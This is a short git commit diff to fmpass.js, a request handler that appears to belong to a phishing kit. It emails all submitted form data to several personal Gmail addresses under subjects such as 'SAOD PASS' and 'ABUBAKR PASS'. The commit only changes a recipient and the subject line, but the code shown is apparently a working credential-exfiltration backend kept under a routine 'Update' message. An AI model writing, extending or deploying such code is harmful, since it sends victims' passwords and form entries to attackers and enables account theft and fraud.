62d30a64efc56436dbae7af3687b671f504ab978
nicklarson7778-gif <nick.larson.7778@gmail.com>
2026-01-18 14:42:51 +0500

    Update fmpass.js

--- fmpass.js
+++ fmpass.js
@@ -38,8 +38,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,businessmehta383@gmail.com",
-      subject: "SAOD PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,nizamaniking567@gmail.com",
+      subject: "ABUBAKR PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
